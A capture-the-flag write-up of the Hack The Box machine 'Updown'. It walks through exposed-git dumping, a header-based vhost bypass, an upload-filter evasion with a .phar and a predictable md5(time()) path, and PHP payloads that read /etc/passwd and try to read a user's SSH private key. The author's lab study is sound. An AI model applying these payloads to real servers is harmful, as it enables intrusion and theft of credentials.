![updown.png](updown.png)

# Updown

## Enum
```bash
# Nmap 7.92 scan initiated Thu Sep 15 15:13:04 2022 as: nmap -vvv -p 22,80 -sC -sV -oN scans/nmap.initial 10.10.11.177
Nmap scan report for 10.10.11.177
Host is up, received conn-refused (0.028s latency).
Scanned at 2022-09-15 15:13:04 IST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDl7j17X/EWcm1MwzD7sKOFZyTUggWH1RRgwFbAK+B6R28x47OJjQW8VO4tCjTyvqKBzpgg7r98xNEykmvnMr0V9eUhg6zf04GfS/gudDF3Fbr3XnZOsrMmryChQdkMyZQK1HULbqRij1tdHaxbIGbG5CmIxbh69mMwBOlinQINCStytTvZq4btP5xSMd8pyzuZdqw3Z58ORSnJAorhBXAmVa9126OoLx7AzL0aO3lqgWjo/wwd3FmcYxAdOjKFbIRiZK/f7RJHty9P2WhhmZ6mZBSTAvIJ36Kb4Z0NuZ+ztfZCCDEw3z3bVXSVR/cp0Z0186gkZv8w8cp/ZHbtJB/nofzEBEeIK8gZqeFc/hwrySA6yBbSg0FYmXSvUuKgtjTgbZvgog66h+98XUgXheX1YPDcnUU66zcZbGsSM1aw1sMqB1vHhd2LGeY8UeQ1pr+lppDwMgce8DO141tj+ozjJouy19Tkc9BB46FNJ43Jl58CbLPdHUcWeMbjwauMrw0=
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKMJ3/md06ho+1RKACqh2T8urLkt1ST6yJ9EXEkuJh0UI/zFcIffzUOeiD2ZHphWyvRDIqm7ikVvNFmigSBUpXI=
|   256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1VZrZbtNuK2LKeBBzfz0gywG4oYxgPl+s5QENjani1
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 15 15:13:11 2022 -- 1 IP address (1 host up) scanned in 7.62 seconds
```

Landing page shows siteisup.htb so we can start to look for subdomains of it with gobuster in the background. As this is running we can start playing with the site, we can use the website check to call our own box:  
![siteisup.png](siteisup.png)

It can call itself too:  
![itself.png](itself.png)

In the meantime gobuster found the dev.siteisup.htb subdomain, but it returns 403  
```bash
gobuster vhost -u siteisup.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://siteisup.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/namelist.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/20 20:20:18 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.siteisup.htb (Status: 403) [Size: 281]
Progress: 48788 / 151266 (32.25%)
```

We might also be able to connect to filtered ports behind a firewall?  
Lets have nmap run on all ports just in case

Can we get a response from dev.siteisup.htb from the health page?.. no  
![isdown.png](isdown.png)

since we receive connections on our own machine we can setup a server that will respond 302 redirect to wherever we want.
```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
```
```bash
python3 redirect.py dev.support.htb
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET / HTTP/1.1" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:22] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:23] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:24] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:24] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:24] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:24] "GET /dev.support.htb HTTP/1.0" 302 -
10.10.11.177 - - [20/Oct/2022 20:50:24] "GET /dev.support.htb HTTP/1.0" 302 -
```
Because I didn't specify http:// it tries to fetch as if it was a path on the same webserver.  
Looks like it tried 20 times, 

Dirbusting the site recursively, it looks like there's a git repo under /dev/
```bash
blnkn@Kolossus:~/sec/htb/machines/updown/www$ dirsearch -u http://siteisup.htb -r -x 403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/siteisup.htb/_22-10-20_23-44-26.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-20_23-44-26.log

Target: http://siteisup.htb/

[23:44:27] Starting:
[23:44:48] 301 -  310B  - /dev  ->  http://siteisup.htb/dev/     (Added to queue)
[23:44:48] 200 -    0B  - /dev/
[23:44:51] 200 -    1KB - /index.php
[23:44:51] 200 -    1KB - /index.php/login/     (Added to queue)
[23:45:11] Starting: dev/
[23:45:13] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/     (Added to queue)
[23:45:14] 200 -    3KB - /dev/.git/
[23:45:14] 200 -  772B  - /dev/.git/branches/     (Added to queue)
[23:45:14] 200 -  298B  - /dev/.git/config
[23:45:14] 200 -   73B  - /dev/.git/description
[23:45:14] 200 -    4KB - /dev/.git/hooks/     (Added to queue)
[23:45:14] 200 -   21B  - /dev/.git/HEAD
[23:45:14] 200 -  959B  - /dev/.git/info/     (Added to queue)
[23:45:14] 200 -  240B  - /dev/.git/info/exclude
[23:45:14] 200 -  521B  - /dev/.git/index
[23:45:14] 200 -  179B  - /dev/.git/logs/HEAD
[23:45:14] 301 -  325B  - /dev/.git/logs/refs  ->  http://siteisup.htb/dev/.git/logs/refs/     (Added to queue)
[23:45:14] 200 -    1KB - /dev/.git/logs/     (Added to queue)
[23:45:14] 301 -  331B  - /dev/.git/logs/refs/heads  ->  http://siteisup.htb/dev/.git/logs/refs/heads/     (Added to queue)
[23:45:14] 301 -  340B  - /dev/.git/logs/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/origin/     (Added to queue)
[23:45:14] 301 -  333B  - /dev/.git/logs/refs/remotes  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/     (Added to queue)
[23:45:14] 200 -  179B  - /dev/.git/logs/refs/remotes/origin/HEAD
[23:45:14] 200 -    1KB - /dev/.git/objects/     (Added to queue)
[23:45:14] 200 -  112B  - /dev/.git/packed-refs
[23:45:14] 301 -  328B  - /dev/.git/refs/remotes  ->  http://siteisup.htb/dev/.git/refs/remotes/     (Added to queue)
[23:45:14] 200 -    1KB - /dev/.git/refs/     (Added to queue)
[23:45:14] 301 -  335B  - /dev/.git/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/refs/remotes/origin/     (Added to queue)
[23:45:14] 200 -   30B  - /dev/.git/refs/remotes/origin/HEAD
[23:45:14] 301 -  326B  - /dev/.git/refs/heads  ->  http://siteisup.htb/dev/.git/refs/heads/     (Added to queue)
[23:45:14] 301 -  325B  - /dev/.git/refs/tags  ->  http://siteisup.htb/dev/.git/refs/tags/     (Added to queue)
[23:45:37] 200 -    0B  - /dev/index.php
[23:45:37] 200 -    0B  - /dev/index.php/login/     (Added to queue)
[23:45:52] Starting: index.php/login/
[23:46:37] Starting: dev/.git/
[23:46:59] 200 -  298B  - /dev/.git/config
[23:47:05] 200 -  521B  - /dev/.git/index
[23:47:05] 301 -  320B  - /dev/.git/info  ->  http://siteisup.htb/dev/.git/info/
[23:47:07] 301 -  320B  - /dev/.git/logs  ->  http://siteisup.htb/dev/.git/logs/
[23:47:07] 200 -    1KB - /dev/.git/logs/
[23:47:10] 301 -  323B  - /dev/.git/objects  ->  http://siteisup.htb/dev/.git/objects/
[23:47:20] Starting: dev/.git/branches/
[################    ] 82%   90610927       194/s       job:5/19 errors:0
```


## Sensitive Information Disclosure - Git repo
We could download things manually but this tool can help automating the process:  
[https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)
```bash 
python3 ~/git-dumper/git_dumper.py http://siteisup.htb/dev/ .
[-] Testing http://siteisup.htb/dev/.git/HEAD [200]
[-] Testing http://siteisup.htb/dev/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://siteisup.htb/dev/.git/ [200]
[-] Fetching http://siteisup.htb/dev/.gitignore [404]
[-] http://siteisup.htb/dev/.gitignore responded with status code 404
[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
[-] Fetching http://siteisup.htb/dev/.git/branches/ [200]
[-] Fetching http://siteisup.htb/dev/.git/config [200]
[-] Fetching http://siteisup.htb/dev/.git/description [200]
[-] Fetching http://siteisup.htb/dev/.git/index [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/ [200]
[-] Fetching http://siteisup.htb/dev/.git/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/ [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-push.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/post-update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/pre-receive.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/info/exclude [200]
[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/info/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/ [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]
[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/HEAD [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
[-] Running git checkout .
Updated 6 paths from the dex
```

And now we can start perusing through the source and the git logs 
```bash
git log --oneline
010dcc3 (HEAD -> main, origin/main, origin/HEAD) Delete index.php
c8fcc40 Update checker.php
f67efd0 Create checker.php
ab9bc16 Update changelog.txt
60d2b32 Create admin.php
c1998f8 Add admin panel.
35a3801 Update changelog.txt
57af03b Create index.php
354fe06 Delete .htpasswd
8812785 New technique in header to protect our dev vhost.
bc4ba79 Update .htaccess
61e5cc0 Update index.php
3d66cd4 Create changelog.txt
4fb1927 Create stylesheet.css
6f89af7 Create index.php
8d1beb1 Create .htpasswd
6ddcc7a Create .htaccess
```

```bash
git show 8812785~ 
commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess

    New technique in header to protect our dev vhost.

diff --git a/.htaccess b/.htaccess
index 3190432..44ff240 100644
--- a/.htaccess
+++ b/.htaccess
@@ -1,5 +1,4 @@
-AuthType Basic
-AuthUserFile /var/www/dev/.htpasswd
-AuthName "Remote Access Denied"
-Require ip 127.0.0.1 ::1
-Require valid-user
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
```

So as explained in the commit we can use that header to get 200 on the dev vhost
```bash
curl -si http://dev.siteisup.htb|head -1
HTTP/1.1 403 Forbidden
```
```bash
curl -siH "Special-Dev: only4dev" http://dev.siteisup.htb|head -1
HTTP/1.1 200 OK
```

Lets setup Burp to add that header on all requests for us:  
![header.png](header.png)  

And we now have access to the dev vhost, that's a similar app to the main one, but we can scan lists of hosts instead of just one

scanning further
```bash
dirsearch -u http://dev.siteisup.htb -r -x 403 -H "Special-Dev: only4dev"

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/dev.siteisup.htb/_22-10-29_17-24-39.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-29_17-24-39.log

Target: http://dev.siteisup.htb/

[17:24:39] Starting:
[17:24:45] 200 -    0B  - /admin.php
[17:24:52] 200 -    1KB - /index.php
[17:24:52] 200 -    1KB - /index.php/login/     (Added to queue)
[17:25:01] 301 -  322B  - /uploads  ->  http://dev.siteisup.htb/uploads/     (Added to queue)
[17:25:01] 200 -  747B  - /uploads/
[17:25:03] Starting: index.php/login/
[17:25:33] Starting: uploads/

Task Completed
```


## Source code Review

index.php is pretty simple and, basically lets us run any php files as long as there's no bin /usr and so on, this might come handy if we figure out a way to upload a php webshell. 
```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }
?>
```

the admin.php that is linked at the top does nothing at this stage
```php
<?php
if(DIRECTACCESS){
        die("Access Denied");
}

#ToDo
?>
```

The changelog seems to coroborate that, and also mentions an upload feature, just what we need.
```
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

So the meat of this web app is checkers.php, lets have a look under the hood.   

checking the special header, like everywhere else
```php
if(DIRECTACCESS){
        die("Access Denied");
}
```


[https://www.php.net/manual/en/function.trim.php](https://www.php.net/manual/en/function.trim.php) - trim is kinda like python strip()    
[https://www.php.net/manual/en/function.curl-exec.php](https://www.php.net/manual/en/function.curl-exec.php)  - it's in the name   
The function at the very top builds the http query with php `curl_init` then does the request with `curl_exec` and closes it with `curl_close` if the curl returns 200 the function returns an array of true, and the data of the curl, else it returns false 
```php
function isitup($url){
        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, trim($url));
        curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $f = curl_exec($ch);
        $header = curl_getinfo($ch);
        if($f AND $header['http_code'] == 200){
                return array(true,$f);
        }else{
                return false;
        }
    curl_close($ch);
}
```

There's another function at the very bottom, this uses `strrpos` string position, to find the dot in the filename and extract the extension out of it.
[https://www.php.net/manual/en/function.strrpos.php](https://www.php.net/manual/en/function.strrpos.php)
```php
function getExtension($file) {
        $extension = strrpos($file,".");
        return ($extension===false) ? "" : substr($file,$extension+1);
}
```

This html form sends a multipart/form-data with 2 fields, one named file of type file, where our file is the host list and size 50, one named check type submit and value Check 
```html
        <form method="post" enctype="multipart/form-data">
                            <label>List of websites to check:</label><br><br>
                                <input type="file" name="file" size="50">
                                <input name="check" type="submit" value="Check">
                </form>

```

So the form would look something like this:
```
POST / HTTP/1.1
Host: dev.siteisup.htb
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3067420814402721157379576655
Content-Length: 492
Origin: http://dev.siteisup.htb
Connection: close
Referer: http://dev.siteisup.htb/
Upgrade-Insecure-Requests: 1

-----------------------------3067420814402721157379576655
Content-Disposition: form-data; name="file"; filename="list.txt"
Content-Type: text/plain

http://127.0.0.1/index.php
http://127.0.0.1/index.php
http://127.0.0.1/index.php
http://127.0.0.1/index.php
http://127.0.0.1/index.php
http://127.0.0.1/index.php

-----------------------------3067420814402721157379576655
Content-Disposition: form-data; name="check"

Check
-----------------------------3067420814402721157379576655--
```

[https://www.php.net/manual/en/function.preg-match.php](https://www.php.net/manual/en/function.preg-match.php) - perform regex match  
[https://www.php.net/manual/en/function.md5.php](https://www.php.net/manual/en/function.md5.php) - make md5 digest   
[https://www.php.net/manual/en/function.time.php](https://www.php.net/manual/en/function.time.php) - get time  

If there's a `check` item in the form proceed,  
Check if the file with name `file` is > 10kb, and die if it isn't   
Get the filename of the file named `file` and store in a variable.   
Extract the extension with the getExtension function we read earlier, and regex match against that list of disallowed extensions, and die if it matches.  

Maybe allowing just one specific type of extension would have been a better choice here, since there's probably gonna be a way to escape the extension check, or just use one that isn't specifically denied, like phar.  
 
Create a dir in uploads which is an md5 digest of the current time, so, this is predictable, if it doesn't already exist create it with 770 permitions  
```php
if($_POST['check']){

        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }

        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
```

[https://www.php.net/manual/en/function.move-uploaded-file.php](https://www.php.net/manual/en/function.move-uploaded-file.php) - move uploaded file to new location   
[https://www.php.net/manual/en/features.file-upload.post-method.php](https://www.php.net/manual/en/features.file-upload.post-method.php) - definition of the `$_FILE` Array  
[https://www.php.net/manual/en/reserved.variables.files.php](https://www.php.net/manual/en/reserved.variables.files.php) - `$_FILE`  
The final path is guessable as it's: `/upload/md5_of_upload_time/originalfilename` since the file variable is taken from the superglobal `$_FILE` and is the provided filename 
```php
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

[https://www.php.net/manual/en/function.explode.php](https://www.php.net/manual/en/function.explode.php) - like python split()  
[https://www.php.net/manual/en/function.file-get-contents.php](https://www.php.net/manual/en/function.file-get-contents.php) - read file into a string   
Read the file from new location, and explode at "\n", into an array called websites  
Start to iterate through the array  
Trim newlines and spaces for the address   
If it did not find regex matches for file:// data:// or ftp:// in the address, proceed, else tell the user that he's a fithy Hecker.   
Run the isitup() func on the site address, and say if its up or down depending on what isitup() returned  
```php
  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                $site=trim($site);
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }
```

Cool, so maybe we can upload a phar that does things we want, figure out the actual location by making a md5 of time ourselves, and run that with the admin page LFI.  


## From file upload filter evasion and predictable upload path to RCE  

We'll start by trying to run a trivial phpinfo() to se if our idea works, and to get more information on the server
```php
<?php
phpinfo()
?>
```

php time() gives epoch, and it does not go smaller than seconds, or at least not without arguments, so, we can generate the md5 based path every seconds, let's have that running on our machine as we upload our phar on the server. 
```php
<?php
while(true){
        $now = time();
        echo "epoch: ".$now." - path: "."http://dev.siteisup.htb/uploads/".md5($now)."/do_thing.phar"."\n";
        sleep(1);
}
?>
```


This didn't work, and that's because I got impatient and didn't realise that the file is getting deleted as soon as it's done iterating through the addresses, since our script has just a few lines, it gets deleted before we even try to hit the uploaded file.
```php
  # Delete the uploaded file.
        @unlink($final_path);
```

So maybe we can still give an actual list of addresses to iterate through before the script, a long one, so that we have time to use the LFI, or alternatively we can play elevator music to the server, ask him to please be patient and listen to vivaldi, while we contact a supervisor, but really we're not, we're trigering an LFI instead. 
```python
from http.server import BaseHTTPRequestHandler,HTTPServer
from time import sleep

class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/elevator':
            # Play vivaldi for a long minute
            print("https://youtu.be/GRxofEmo3HA")
            sleep(60)
        self.send_response(200)

server = HTTPServer(('', 8000), myHandler)
server.serve_forever()
```

`do_thing.phar`
```php
http://10.10.14.35:8000/elevator
<?php
phpinfo()
?>
```

`truely_random.php`
```php
<?php
while(true){
        $now = time();
        echo "epoch: ".$now." - path: "."http://dev.siteisup.htb/uploads/".md5($now)."/do_thing.phar"."\n";
        sleep(1);
}
?>
```

So I know that the original idea was to use the admin page, but it won't work, as it would need to end in .php, doesn't matter, in fact we can just trigger it directly. 
```bash
php -f truely_random.phar
epoch: 1667073507 - path: http://dev.siteisup.htb/uploads/85a641c8505df5499904db2d1d5832d1/do_thing.phar
epoch: 1667073508 - path: http://dev.siteisup.htb/uploads/8265a2da8eff27a6a1ce3794cd0dc015/do_thing.phar
epoch: 1667073509 - path: http://dev.siteisup.htb/uploads/fb364b84dbebe871d9e5ff2a9cfe8399/do_thing.phar
epoch: 1667073510 - path: http://dev.siteisup.htb/uploads/c9fcf577d1f013918e2bebf94780b267/do_thing.phar
^C
```

clicking those paths and this works, as until the server stops listening to vivaldi, it actually times out on the server side before we send 200 but hey ... it did the job   
![phpinfo.png](phpinfo.png)


## Exploring system files with the RCE
A quick look at the disabled functions and we know we're probably not gonna be able to do a reverse shell directly, but we know we can use `file_get_contents()` as we saw it used in checker.php, maybe we can use that read some files on the box instead?   
![disabled.png](disabled.png)

```php
http://10.10.14.35:8000/elevator
<?php
$file = file_get_contents("/etc/passwd");
$file = explode("\n", $file);
$file = implode("<br>", $file);
echo $file;
?>
```
```
http://10.10.14.35:8000/elevator root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
developer:x:1002:1002::/home/developer:/bin/bash
```

```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
developer:x:1002:1002::/home/developer:/bin/bash
```

There's a developer user, can we get the private key?
```bash
http://10.10.14.35:8000/elevator
<?php
$file = file_get_contents("/home/developer/.ssh/id_rsa");
$file = explode("\n", $file);
$file = implode("<br>", $file);
echo $file;
?>
```
no we can't, this is apache so we're probably running as www-data, trying to think of other files we could try to look at, maybe the apache vhost config file in case there's another vhost? There doesn't seem to be a database as far as we can see, so that would be a shot in the dark, I'm sure there are things we could think of pulling off the box but it's probably not the right track, lets circle back to what exactly is disabled or not on the php server, and see if we can push this RCE a step further and get a reverse shell.


## Further enumeraton of the PHP Server
![disabled.png](disabled.png)  

```bash
printf 'pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen'|tr "," "\n"
pcntl_alarm
pcntl_fork
pcntl_waitpid
pcntl_wait
pcntl_wifexited
pcntl_wifstopped
pcntl_wifsignaled
pcntl_wifcontinued
pcntl_wexitstatus
pcntl_wtermsig
pcntl_wstopsig
pcntl_signal
pcntl_signal_get_handler
pcntl_signal_dispatch
pcntl_get_last_error
pcntl_strerror
pcntl_sigprocmask
pcntl_sigwaitinfo
pcntl_sigtimedwait
pcntl_exec
pcntl_getpriority
pcntl_setpriority
pcntl_async_signals
pcntl_unshare
error_log
system
exec
shell_exec
popen
passthru
link
symlink
syslog
ld
mail
stream_socket_sendto
dl
stream_socket_client
fsockopen
```

